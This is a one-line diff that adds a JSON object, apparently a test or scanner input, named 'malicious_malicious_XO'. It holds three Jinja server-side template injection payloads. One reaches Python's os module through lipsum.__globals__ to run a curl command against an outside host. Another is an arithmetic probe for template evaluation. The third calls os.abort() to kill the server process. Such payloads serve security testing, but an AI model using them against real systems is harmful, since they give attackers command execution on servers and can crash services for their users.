@@ -1,0 +1,1 @@
+{"mode":"json","json_payload":{"project_name":"malicious_malicious_XO","ssti_payload1":"{{lipsum.__globals__['os'].popen('curl -s https://api.restful-api.dev/objects').read()}}","ssti_payload2":"{{4628174232+8}}","ssti_payload3":"{{lipsum.__globals__['os'].abort()}}"}}
